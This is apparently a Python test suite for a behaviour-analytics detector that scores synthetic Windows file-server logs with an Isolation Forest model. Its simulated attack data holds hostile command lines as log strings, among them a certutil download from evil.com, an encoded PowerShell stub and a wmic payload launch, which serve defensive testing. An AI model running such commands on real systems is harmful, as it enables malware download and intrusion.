"""
=============================================================================
APT File Server UEBA — Automated Test Pipeline
Full test coverage for 13 Event IDs and 25 behavioral features.
=============================================================================
"""

from __future__ import annotations

import sys
import traceback
from datetime import datetime, timedelta
from typing import Any

import numpy as np
import pandas as pd

from file_server_log_parser import FileServerLogParser, UEBA_RELEVANT_FLAGS, LOLBIN_NAMES
from ueba_feature_extractor import UEBAFeatureExtractor, FEATURE_COLUMNS
from individual_baseline_model import IndividualBaselineModel, ML_FEATURE_COLUMNS

# ---------------------------------------------------------------------------
# Test counters
# ---------------------------------------------------------------------------
PASS_COUNT = 0
FAIL_COUNT = 0


def check(condition: bool, message: str) -> None:
    """Assert a test condition and track results."""
    global PASS_COUNT, FAIL_COUNT
    if condition:
        PASS_COUNT += 1
        print(f"  ✅ PASS: {message}")
    else:
        FAIL_COUNT += 1
        print(f"  ❌ FAIL: {message}")


# ---------------------------------------------------------------------------
# Helper: LOLBin detection (mirrors parser logic)
# ---------------------------------------------------------------------------

def _detect_lolbin_row(row: pd.Series) -> bool:
    """Check if any process field is a known LOLBin."""
    for field in ["ProcessName", "NewProcessName", "ParentProcessName"]:
        val = row.get(field, "")
        if isinstance(val, str) and val:
            basename = val.rsplit("\\", 1)[-1].lower()
            if basename in LOLBIN_NAMES:
                return True
    return False


# ---------------------------------------------------------------------------
# Helper: generate synthetic log data with ALL event types
# ---------------------------------------------------------------------------

def generate_normal_log_data(
    user: str = "analyst01",
    n_days: int = 5,
    events_per_hour: int = 20,
    base_time: datetime | None = None,
) -> pd.DataFrame:
    """
    Generate synthetic UEBA log data simulating normal user behavior.
    Includes file access, authentication, process execution events.
    """
    if base_time is None:
        base_date = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        base_time = base_date.replace(hour=0, minute=0, second=0, microsecond=0)

    rng = np.random.RandomState(42)
    records: list[dict[str, Any]] = []

    for day in range(n_days):
        for hour in range(8, 18):  # Business hours only
            ts_base = base_time + timedelta(days=day, hours=hour)

            for i in range(events_per_hour):
                ts = ts_base + timedelta(minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))

                # 60% file access (4663), 20% auth (4624), 10% process (4688),
                # 5% share (5140), 5% other file (4656/5145)
                roll = rng.random()
                if roll < 0.60:
                    eid = 4663
                    mask_choices = ["0x1", "0x2", "0x3", "0x1", "0x1"]
                    records.append({
                        "TimeCreated": ts.isoformat(),
                        "EventID": eid,
                        "EventCategory": "file_access",
                        "SubjectUserName": user,
                        "ObjectName": f"C:\\Shares\\Dept\\file_{rng.randint(1, 50)}.docx",
                        "ProcessName": rng.choice(["explorer.exe", "winword.exe", "excel.exe"]),
                        "IpAddress": "local",
                        "AccessMask_Raw": rng.choice(mask_choices),
                        "TargetUserName": "", "LogonType": "", "FailureReason": "",
                        "NewProcessName": "", "CommandLine": "", "ParentProcessName": "",
                        "TaskName": "", "ServiceName": "", "ServiceFileName": "",
                        "ShareName": "",
                    })
                elif roll < 0.80:
                    records.append({
                        "TimeCreated": ts.isoformat(),
                        "EventID": 4624,
                        "EventCategory": "authentication",
                        "SubjectUserName": user,
                        "ObjectName": "",
                        "ProcessName": "lsass.exe",
                        "IpAddress": f"10.0.{rng.randint(1,3)}.{rng.randint(10,20)}",
                        "AccessMask_Raw": "0x0",
                        "TargetUserName": user, "LogonType": "3",
                        "FailureReason": "",
                        "NewProcessName": "", "CommandLine": "", "ParentProcessName": "",
                        "TaskName": "", "ServiceName": "", "ServiceFileName": "",
                        "ShareName": "",
                    })
                elif roll < 0.90:
                    records.append({
                        "TimeCreated": ts.isoformat(),
                        "EventID": 4688,
                        "EventCategory": "process",
                        "SubjectUserName": user,
                        "ObjectName": "",
                        "ProcessName": rng.choice(["notepad.exe", "calc.exe", "chrome.exe"]),
                        "IpAddress": "local",
                        "AccessMask_Raw": "0x0",
                        "TargetUserName": "", "LogonType": "", "FailureReason": "",
                        "NewProcessName": rng.choice(["notepad.exe", "calc.exe", "chrome.exe"]),
                        "CommandLine": "",
                        "ParentProcessName": "explorer.exe",
                        "TaskName": "", "ServiceName": "", "ServiceFileName": "",
                        "ShareName": "",
                    })
                elif roll < 0.95:
                    records.append({
                        "TimeCreated": ts.isoformat(),
                        "EventID": 5140,
                        "EventCategory": "file_access",
                        "SubjectUserName": user,
                        "ObjectName": "\\\\*\\Shares",
                        "ProcessName": "",
                        "IpAddress": f"10.0.1.{rng.randint(10,20)}",
                        "AccessMask_Raw": "0x1",
                        "TargetUserName": "", "LogonType": "", "FailureReason": "",
                        "NewProcessName": "", "CommandLine": "", "ParentProcessName": "",
                        "TaskName": "", "ServiceName": "", "ServiceFileName": "",
                        "ShareName": "\\\\*\\Shares",
                    })
                else:
                    records.append({
                        "TimeCreated": ts.isoformat(),
                        "EventID": 4656,
                        "EventCategory": "file_access",
                        "SubjectUserName": user,
                        "ObjectName": f"C:\\Shares\\file_{rng.randint(1, 20)}.xlsx",
                        "ProcessName": "excel.exe",
                        "IpAddress": "local",
                        "AccessMask_Raw": "0x1",
                        "TargetUserName": "", "LogonType": "", "FailureReason": "",
                        "NewProcessName": "", "CommandLine": "", "ParentProcessName": "",
                        "TaskName": "", "ServiceName": "", "ServiceFileName": "",
                        "ShareName": "",
                    })

    df = pd.DataFrame(records)
    df["is_lolbin"] = df.apply(_detect_lolbin_row, axis=1)
    return df


def generate_attack_log_data(
    user: str = "compromised_user",
    base_time: datetime | None = None,
) -> pd.DataFrame:
    """
    Generate synthetic APT attack data across FULL kill-chain:
    - Brute-force (failed logons)
    - Credential abuse (4648)
    - LOLBin execution (powershell, certutil)
    - Mass file access at off-hours
    - Persistence (scheduled tasks, services)
    - Anti-forensics (log clearing)
    """
    if base_time is None:
        base_time = datetime(2024, 6, 1, 2, 0, 0)  # 2 AM — off-hours

    records: list[dict[str, Any]] = []
    ts = base_time

    def _rec(eid, cat, **kwargs):
        nonlocal ts
        base = {
            "TimeCreated": ts.isoformat(),
            "EventID": eid,
            "EventCategory": cat,
            "SubjectUserName": user,
            "ObjectName": "", "ProcessName": "", "IpAddress": "local",
            "AccessMask_Raw": "0x0",
            "TargetUserName": "", "LogonType": "", "FailureReason": "",
            "NewProcessName": "", "CommandLine": "", "ParentProcessName": "",
            "TaskName": "", "ServiceName": "", "ServiceFileName": "",
            "ShareName": "",
        }
        base.update(kwargs)
        records.append(base)
        ts += timedelta(seconds=2)

    # Phase 1: Brute-force — 15 failed logons from external IP
    for i in range(15):
        _rec(4625, "authentication",
             TargetUserName=user, LogonType="3",
             FailureReason="%%2313",
             IpAddress="185.220.101.42")

    # Phase 2: Successful logon after brute-force
    _rec(4624, "authentication",
         TargetUserName=user, LogonType="3",
         IpAddress="185.220.101.42")

    # Phase 3: Explicit credential use (Pass-the-Hash)
    for i in range(3):
        _rec(4648, "authentication",
             TargetUserName="domain_admin",
             ObjectName="DC01.corp.local",
             ProcessName="lsass.exe")

    # Phase 4: LOLBin execution
    _rec(4688, "process",
         NewProcessName="C:\\Windows\\System32\\powershell.exe",
         CommandLine="powershell -enc SQBFAFgA...",
         ParentProcessName="cmd.exe",
         ProcessName="C:\\Windows\\System32\\powershell.exe")

    _rec(4688, "process",
         NewProcessName="C:\\Windows\\System32\\certutil.exe",
         CommandLine="certutil -urlcache -split -f http://evil.com/payload.exe",
         ParentProcessName="powershell.exe",
         ProcessName="C:\\Windows\\System32\\certutil.exe")

    _rec(4688, "process",
         NewProcessName="C:\\Windows\\System32\\wmic.exe",
         CommandLine="wmic process call create payload.exe",
         ParentProcessName="powershell.exe",
         ProcessName="C:\\Windows\\System32\\wmic.exe")

    # Phase 5: Mass file read via admin shares (data staging)
    for i in range(50):
        _rec(4663, "file_access",
             ObjectName=f"\\\\DC01\\C$\\Users\\admin\\secrets_{i}.pdf",
             ProcessName="C:\\Windows\\System32\\powershell.exe",
             AccessMask_Raw="0x1")

    # Phase 6: Persistence — scheduled task + service
    _rec(4698, "persistence",
         TaskName="\\Microsoft\\Windows\\Maintenance\\UpdateCheck",
         SubjectUserName=user)

    _rec(7045, "persistence",
         ServiceName="WindowsHealthService",
         ServiceFileName="C:\\Windows\\Temp\\svc.exe",
         SubjectUserName=user)

    # Phase 7: Anti-forensics — clear audit log
    _rec(1102, "anti_forensics",
         ObjectName="Audit Log Cleared",
         SubjectUserName=user)

    # Phase 8: Delete evidence files
    for i in range(5):
        _rec(4660, "file_access",
             ObjectName=f"C:\\Temp\\tool_{i}.exe",
             ProcessName="cmd.exe",
             AccessMask_Raw="0x10000")

    df = pd.DataFrame(records)
    df["is_lolbin"] = df.apply(_detect_lolbin_row, axis=1)
    return df


# ===================================================================
# TEST SUITE 1: AccessMask Bitwise Decoding
# ===================================================================

def test_access_mask_decoding():
    print("\n📋 Test Suite 1: AccessMask Bitwise Decoding")
    print("─" * 50)

    d = FileServerLogParser.decode_access_mask

    check(d("0x1")["ReadData"] == True,   "0x1 → ReadData=True")
    check(d("0x1")["WriteData"] == False,  "0x1 → WriteData=False")
    check(d("0x3")["ReadData"] == True,    "0x3 → ReadData=True")
    check(d("0x3")["WriteData"] == True,   "0x3 → WriteData=True")
    check(d("0x3")["AppendData"] == False, "0x3 → AppendData=False")
    check(d("0x10000")["DELETE"] == True,  "0x10000 → DELETE=True")
    check(d("0x10000")["ReadData"] == False, "0x10000 → ReadData=False")
    check(d("0x40000")["WRITE_DAC"] == True, "0x40000 → WRITE_DAC=True")
    check(d("0x10003")["ReadData"] == True,  "0x10003 → ReadData=True")
    check(d("0x10003")["WriteData"] == True, "0x10003 → WriteData=True")
    check(d("0x10003")["DELETE"] == True,    "0x10003 → DELETE=True")
    check(d("0x10003")["AppendData"] == False, "0x10003 → AppendData=False")

    # Edge cases
    all_false = d("0x0")
    check(all(not v for v in all_false.values()), "0x0 → all False")
    all_false2 = d("")
    check(all(not v for v in all_false2.values()), "empty string → all False")
    all_false3 = d("not_a_hex")
    check(all(not v for v in all_false3.values()), "invalid string → all False")
    check(d("1")["ReadData"] == True, "decimal '1' → ReadData=True")


# ===================================================================
# TEST SUITE 2: Feature Extraction (All Event Types)
# ===================================================================

def test_feature_extraction():
    print("\n📋 Test Suite 2: Feature Extraction (All Event Types)")
    print("─" * 50)

    base_time = datetime(2024, 6, 1, 0, 0, 0)  # Midnight
    data = generate_normal_log_data(
        user="test_user",
        n_days=2,
        events_per_hour=10,
        base_time=base_time,
    )

    extractor = UEBAFeatureExtractor(time_window="1h")
    features = extractor.extract_features(data)

    # Basic structure
    check(len(features) > 0, "Feature matrix is non-empty")

    # Check all 25 features exist
    for col in FEATURE_COLUMNS:
        check(col in features.columns, f"Column '{col}' exists")

    # Check user is present
    check("SubjectUserName" in features.columns, "SubjectUserName column present")
    check("test_user" in features["SubjectUserName"].values, "User 'test_user' in results")

    # Volume features
    check(features["total_read_operations"].sum() >= 0, "total_read_operations >= 0")
    check(features["total_write_operations"].sum() >= 0, "total_write_operations >= 0")
    check(features["total_events"].sum() > 0, "total_events > 0")

    # Off-hour ratio for business-hours data should be ~0
    check(
        features["off_hour_activity_ratio"].mean() < 0.15,
        f"Business-hour data has low off_hour_ratio ({features['off_hour_activity_ratio'].mean():.3f})"
    )

    # Authentication features (generated data has ~20% 4624 events)
    check(features["successful_logon_count"].sum() > 0,
          f"successful_logon_count > 0 ({features['successful_logon_count'].sum():.0f})")

    # Process features (generated data has ~10% 4688 events)
    check(features["new_process_count"].sum() > 0,
          f"new_process_count > 0 ({features['new_process_count'].sum():.0f})")

    # Share features (generated data has ~5% 5140 events)
    check(features["share_session_count"].sum() > 0,
          f"share_session_count > 0 ({features['share_session_count'].sum():.0f})")


# ===================================================================
# TEST SUITE 3: Attack Data Feature Extraction
# ===================================================================

def test_attack_features():
    print("\n📋 Test Suite 3: Attack Data Feature Extraction")
    print("─" * 50)

    attack_data = generate_attack_log_data(user="attacker")
    extractor = UEBAFeatureExtractor(time_window="1h")
    features = extractor.extract_features(attack_data)

    check(len(features) > 0, "Attack features are non-empty")

    # Should detect failed logons (15 brute-force attempts)
    total_failed = features["failed_logon_count"].sum()
    check(total_failed == 15, f"Failed logon count = 15 (got {total_failed:.0f})")

    # Should have high failed_logon_ratio
    max_ratio = features["failed_logon_ratio"].max()
    check(max_ratio > 0.8, f"Failed logon ratio > 0.8 (got {max_ratio:.2f})")

    # Should detect explicit credential use (3 events)
    total_cred = features["explicit_credential_count"].sum()
    check(total_cred == 3, f"Explicit credential count = 3 (got {total_cred:.0f})")

    # Should detect LOLBin processes (powershell, certutil, wmic)
    total_lolbin = features["lolbin_event_count"].sum()
    check(total_lolbin > 0, f"LOLBin event count > 0 (got {total_lolbin:.0f})")

    total_suspicious = features["suspicious_process_count"].sum()
    check(total_suspicious > 0, f"Suspicious process count > 0 (got {total_suspicious:.0f})")

    # Should detect new processes (3 LOLBin + possible others)
    total_procs = features["new_process_count"].sum()
    check(total_procs >= 3, f"New process count >= 3 (got {total_procs:.0f})")

    # Should detect persistence (1 scheduled task + 1 service)
    total_tasks = features["scheduled_task_created_count"].sum()
    check(total_tasks == 1, f"Scheduled task count = 1 (got {total_tasks:.0f})")

    total_services = features["service_installed_count"].sum()
    check(total_services == 1, f"Service installed count = 1 (got {total_services:.0f})")

    # Should detect anti-forensics (1 log cleared + 5 object deleted)
    log_cleared = features["audit_log_cleared_count"].sum()
    check(log_cleared == 1, f"Audit log cleared count = 1 (got {log_cleared:.0f})")

    obj_deleted = features["object_deleted_count"].sum()
    check(obj_deleted == 5, f"Object deleted count = 5 (got {obj_deleted:.0f})")

    # Off-hour ratio should be 1.0 (all events at 2 AM)
    off_hour = features["off_hour_activity_ratio"].max()
    check(off_hour == 1.0, f"Off-hour ratio = 1.0 for 2AM attack (got {off_hour:.3f})")


# ===================================================================
# TEST SUITE 4: Individual Baseline (Isolation Forest)
# ===================================================================

def test_isolation_forest():
    print("\n📋 Test Suite 4: Individual Baseline (Isolation Forest)")
    print("─" * 50)

    # Generate sufficient normal data
    base_time = datetime(2024, 6, 1, 0, 0, 0)
    normal_data = generate_normal_log_data(
        user="normal_user", n_days=7, events_per_hour=20, base_time=base_time
    )
    attack_data = generate_attack_log_data(
        user="normal_user", base_time=datetime(2024, 6, 8, 2, 0, 0)
    )

    extractor = UEBAFeatureExtractor(time_window="1h")
    normal_features = extractor.extract_features(normal_data)
    attack_features = extractor.extract_features(attack_data)

    check(len(normal_features) > 0, "Normal features are non-empty")
    check(len(attack_features) > 0, "Attack features are non-empty")

    # Train on normal, test on attack
    model = IndividualBaselineModel(contamination=0.05)
    model.fit(normal_features)
    check(True, "Model fitting succeeded")

    # Evaluate normal
    normal_results = model.predict(normal_features)
    normal_avg = normal_results["anomaly_score"].mean()
    print(f"Detected {normal_results['is_anomaly'].sum()} anomalous windows "
          f"out of {len(normal_results)} evaluated.")
    check(normal_avg < 80, f"Normal data avg score is moderate ({normal_avg:.1f})")

    # Evaluate attack
    attack_results = model.predict(attack_features)
    attack_max = attack_results["anomaly_score"].max()
    print(f"Detected {attack_results['is_anomaly'].sum()} anomalous windows "
          f"out of {len(attack_results)} evaluated.")
    check(attack_max >= 80, f"Attack data max score is high ({attack_max:.1f})")
    check(attack_results["is_anomaly"].any(), "Attack data triggers at least one anomaly flag")
    check(attack_max > normal_avg, f"Attack score ({attack_max:.1f}) > Normal score ({normal_avg:.1f})")

    # Feature importance
    importance = model.get_feature_importances(attack_features)
    check(isinstance(importance, pd.DataFrame), "Feature importance returns DataFrame")
    check("z_deviation" in importance.columns, "Feature importance has z_deviation column")
    top_z = importance["z_deviation"].max()
    check(top_z > 1.0, f"Top feature deviation z-score is significant ({top_z:.2f})")

    # Show detail
    print(f"\n  📊 Detailed Results:")
    print(f"     Normal data — Mean score: {normal_avg:.1f}, "
          f"Anomalies: {normal_results['is_anomaly'].sum()}/{len(normal_results)}")
    print(f"     Attack data — Mean score: {attack_results['anomaly_score'].mean():.1f}, "
          f"Anomalies: {attack_results['is_anomaly'].sum()}/{len(attack_results)}")

    # Show top features driving anomaly
    print(f"\n  🔍 Top features driving attack detection:")
    for _, feat in importance.head(5).iterrows():
        print(f"     {feat['feature']:35s} z={feat['z_deviation']:6.2f}")


# ===================================================================
# TEST SUITE 5: Edge Cases & Error Handling
# ===================================================================

def test_edge_cases():
    print("\n📋 Test Suite 5: Edge Cases & Error Handling")
    print("─" * 50)

    # Empty DataFrame
    empty_df = pd.DataFrame(columns=[
        "TimeCreated", "EventID", "EventCategory", "SubjectUserName",
        "ObjectName", "ProcessName", "IpAddress", "AccessMask_Raw",
        "TargetUserName", "LogonType", "FailureReason",
        "NewProcessName", "CommandLine", "ParentProcessName",
        "TaskName", "ServiceName", "ServiceFileName", "ShareName",
        "is_read", "is_write", "is_append", "is_delete", "is_write_dac",
        "is_lolbin",
    ])
    extractor = UEBAFeatureExtractor()
    result = extractor.extract_features(empty_df)
    check(result.empty, "Empty DataFrame produces empty features")

    # Model rejects tiny dataset
    tiny = generate_normal_log_data(user="tiny", n_days=1, events_per_hour=1)
    tiny_features = extractor.extract_features(tiny)
    model = IndividualBaselineModel()
    try:
        model.fit(tiny_features.head(3))
        check(False, "Model should reject tiny dataset")
    except ValueError:
        check(True, "Model rejects tiny dataset (ValueError raised)")

    # Model rejects predict before fit
    model2 = IndividualBaselineModel()
    try:
        model2.predict(tiny_features)
        check(False, "Model should reject predict before fit")
    except RuntimeError:
        check(True, "Model rejects predict before fit (RuntimeError raised)")

    # Parser rejects missing file
    try:
        FileServerLogParser("nonexistent_file.json")
        check(False, "Should raise FileNotFoundError")
    except FileNotFoundError:
        check(True, "FileNotFoundError for missing file")

    # Parser rejects unsupported format
    try:
        FileServerLogParser("test.xyz")
        check(False, "Should raise ValueError for unsupported format")
    except (ValueError, FileNotFoundError):
        check(True, "Error raised for unsupported format")


# ===================================================================
# Main
# ===================================================================

if __name__ == "__main__":
    print("\n" + "=" * 70)
    print("  APT File Server UEBA — Automated Test Pipeline")
    print("  Full Coverage: 13 Event IDs, 25 Features")
    print("=" * 70)

    try:
        test_access_mask_decoding()
        test_feature_extraction()
        test_attack_features()
        test_isolation_forest()
        test_edge_cases()
    except Exception as e:
        print(f"\n💥 Unexpected error: {e}")
        traceback.print_exc()
        FAIL_COUNT += 1

    total = PASS_COUNT + FAIL_COUNT
    print(f"\n{'=' * 70}")
    print(f"  Test Results: {PASS_COUNT}/{total} passed")
    if FAIL_COUNT == 0:
        print("  🎉 All tests passed!")
    else:
        print(f"  ❌ {FAIL_COUNT} test(s) failed.")
    print("=" * 70)

    sys.exit(0 if FAIL_COUNT == 0 else 1)
